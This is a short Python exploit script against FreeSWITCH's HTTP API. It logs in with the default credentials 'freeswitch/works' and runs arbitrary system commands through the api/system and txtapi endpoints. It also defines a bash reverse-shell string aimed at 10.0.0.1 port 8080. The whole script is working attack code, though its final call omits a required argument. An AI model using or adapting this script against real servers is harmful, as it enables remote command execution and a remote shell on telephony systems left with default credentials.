#!/usr/bin/python
# -*- coding: UTF-8 -*-
#author b1u3r


import requests
from requests.auth import HTTPBasicAuth

username = "freeswitch"
password = "works"
apis = [        "{target}/api/system?{command}",
                "{target}/api/bg_system?{command}",
                "{target}/txtapi/system?{command}",
                "{target}/txtapi/bg_system?{command}",
                "{target}/txtapi/version"]

shell = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

def exp(target , command):
    for i in range(4):
        r = requests.get((apis[i].format(target=target, command=command)), auth=HTTPBasicAuth(username, password))
        if r.status_code == 200:
            print "[+] execute successful response:" + r.content
            break
        else:
            print target + " failed"

def version(target):
    r = requests.get((apis[4].format(target=target)) , auth=HTTPBasicAuth(username, password))
    if r.status_code == 200:
        print r.content
    else:
        print target + " auth failed"


if __name__ == '__main__':
    version("http://127.0.0.1:8080/")
    exp("http://127.0.0.1:8080/")